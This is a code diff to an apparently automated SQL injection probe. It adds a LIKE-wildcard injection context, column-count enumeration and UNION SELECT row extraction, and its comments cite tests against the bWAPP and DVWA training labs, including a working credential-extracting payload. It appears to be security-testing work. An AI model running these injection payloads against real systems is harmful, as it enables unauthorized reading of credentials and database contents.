@@ -254,8 +254,21 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
                        f"({', '.join(silent)}) - a dropped request is not a "
                        "differing response, and those comparisons were not "
                        "scored. " + out["note"])
-    # opt-in ORDER BY enumeration: the first n that errors or empties the
-    # page bounds the column count - the number a UNION SELECT must match
+    # ORDER BY enumeration: the first n that errors or empties the page
+    # bounds the column count - the number a UNION SELECT must match.
+    #
+    # Opt-in when the caller only wants the count, and NOT optional when an
+    # extraction was asked for, because the extraction below pads its
+    # column list to `out["union"]["columns"]` and silently falls back to
+    # however many columns the caller happened to name. Measured on bWAPP's
+    # sqli_1.php, whose SELECT has seven: asked for `login,password` with no
+    # `union_cols`, the probe built a two-column UNION and the engine
+    # answered "The used SELECT statements have a different number of
+    # columns". DVWA's two-column page worked by coincidence of arity. The
+    # capability was already here; it just was not wired to the thing that
+    # needs it.
+    if union_cols <= 0 and extract_table:
+        union_cols = 10
     if union_cols > 0:
         # pick the frag family that parsed earlier: on a quoted context the
         # unquoted ORDER BY lands inside the string and always "fails";
@@ -263,23 +276,61 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
         numeric_ctx = verdict == "boolean-blind candidate (numeric context)" \
             or (numeric_ok and (nsim < 0.85 or nstatus_diff)
                 and quoted_ok and sim >= 0.85)
-        frag = (lambda n: f"1 ORDER BY {n}-- -") if numeric_ctx \
-            else (lambda n: f"1' ORDER BY {n}-- -")
-        cols, trace = None, []
-        for n in range(1, _ival(union_cols, 8, 0, 30) + 1):
-            rr = _send(ctx, url, param, frag(n), method, data, tool,
-                       f"orderby-{n}")
-            rbody = rr.get("body") or ""
-            failed = bool(SQL_ERRORS.search(rbody)) or \
-                rr["status"] >= 400 or \
-                _similarity(rbody, bodies["base"]) < 0.5
-            trace.append({"n": n, "request_id": rr["request_id"],
-                          "failed": failed})
-            if failed:
-                cols = n - 1
+        # Three families, not two. A parameter interpolated into a LIKE
+        # pattern - `WHERE title LIKE '%$title%'` - needs the WILDCARD close
+        # `x%'`, because a bare `1'` lands inside the pattern and the engine
+        # never sees a statement boundary. Measured on bWAPP's sqli_1.php:
+        # `1' ORDER BY 1-- -` returned a page similar to nothing and the
+        # enumeration stopped at cols=0, so the extraction below fell back
+        # to the caller's column count, built a two-column UNION against a
+        # seven-column SELECT, and got "The used SELECT statements have a
+        # different number of columns". With `iron%' ORDER BY 9-- -` the
+        # same endpoint answers `Unknown column '9' in 'order clause'` -
+        # the enumeration works there, bounds it at 7, and
+        # `iron%' UNION SELECT 1,login,password,4,5,6,7 FROM users-- -`
+        # returns `<td>bee</td>`.
+        #
+        # Tried in order and the first that ENUMERATES wins: a family that
+        # fails at n=1 has not found a boundary, it has found that this is
+        # not its context.
+        families = ([("numeric", lambda n: f"1 ORDER BY {n}-- -")]
+                    if numeric_ctx else
+                    [("quoted", lambda n: f"1' ORDER BY {n}-- -")])
+        families.append(("wildcard", lambda n: f"argus%' ORDER BY {n}-- -"))
+        cols, trace, ctx_name = None, [], families[0][0]
+        for name, frag in families:
+            fcols, ftrace = None, []
+            for n in range(1, _ival(union_cols, 8, 0, 30) + 1):
+                rr = _send(ctx, url, param, frag(n), method, data, tool,
+                           f"orderby-{name}-{n}")
+                rbody = rr.get("body") or ""
+                # A DIFFERENCE from the baseline, not an absolute match.
+                # `SQL_ERRORS` recognises an engine naming itself, which is
+                # also what a page does when it merely MENTIONS one -
+                # bWAPP's search page carries the word "SQLite" in its own
+                # chrome, so `ORDER BY 1` scored as a failure on a response
+                # byte-identical to the baseline (similarity 1.000), the
+                # enumeration aborted at n=1, and the extraction fell back
+                # to the caller's column count. The real failure is visible
+                # the same way every other differential in this file is:
+                # at n=8 the body went from 13475 bytes to 2193 and
+                # similarity to 0.211.
+                base_err = bool(SQL_ERRORS.search(bodies["base"]))
+                failed = (bool(SQL_ERRORS.search(rbody)) and not base_err) or \
+                    rr["status"] >= 400 or \
+                    _similarity(rbody, bodies["base"]) < 0.5
+                ftrace.append({"n": n, "request_id": rr["request_id"],
+                               "failed": failed})
+                if failed:
+                    fcols = n - 1
+                    break
+            trace += ftrace
+            if fcols:                      # 0 means n=1 already failed
+                cols, ctx_name = fcols, name
                 break
-        out["union"] = {"columns": cols, "context": "numeric" if numeric_ctx
-                        else "quoted", "trace": trace,
+            if cols is None:
+                cols = fcols
+        out["union"] = {"columns": cols, "context": ctx_name, "trace": trace,
                         "note": "column count for UNION SELECT; verify "
                                 "with UNION SELECT NULL,... before citing"}
     # Opt-in bounded read. The sqli class is proven by a row from a named
@@ -302,8 +353,11 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
         width = max(int(width or len(columns)), len(columns))
         selected = columns + ["NULL"] * (width - len(columns))
         rows = _ival(extract_rows, 5, 1, 20)
-        quoted_ctx = not ((out.get("union") or {}).get("context") == "numeric")
-        prefix = "1' " if quoted_ctx else "1 "
+        # the prefix has to be the family that ENUMERATED, or the UNION is
+        # built for a context the parameter is not in
+        _fam = (out.get("union") or {}).get("context")
+        prefix = ("1 " if _fam == "numeric" else
+                  "argus%' " if _fam == "wildcard" else "1' ")
         payload = (f"{prefix}UNION SELECT {', '.join(selected)} FROM {table} "
                    f"LIMIT {rows}-- -")
         r = _send(ctx, url, param, payload, method, data, tool,
